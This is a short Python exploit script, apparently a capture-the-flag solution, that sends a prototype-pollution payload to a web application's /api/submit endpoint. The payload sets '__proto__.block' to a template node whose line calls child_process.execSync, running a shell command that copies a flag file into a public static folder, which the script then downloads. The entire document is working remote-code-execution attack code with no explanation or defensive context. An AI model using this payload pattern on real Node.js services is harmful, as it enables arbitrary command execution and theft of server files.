import requests


ENDPOINT = 'http://83.136.252.214:37094/api/submit'

OUTPUT = 'http://83.136.252.214:37094/static/out'


request = requests.post(ENDPOINT, json = {

   "artist.name":"Gingell",

       "__proto__.block": {

           "type":"Text",

           "line":"process.mainModule.require('child_process').execSync('cat flag0R3E2 > /app/static/out')"

       }

})

print (request.text)

print (requests.get(OUTPUT).text)
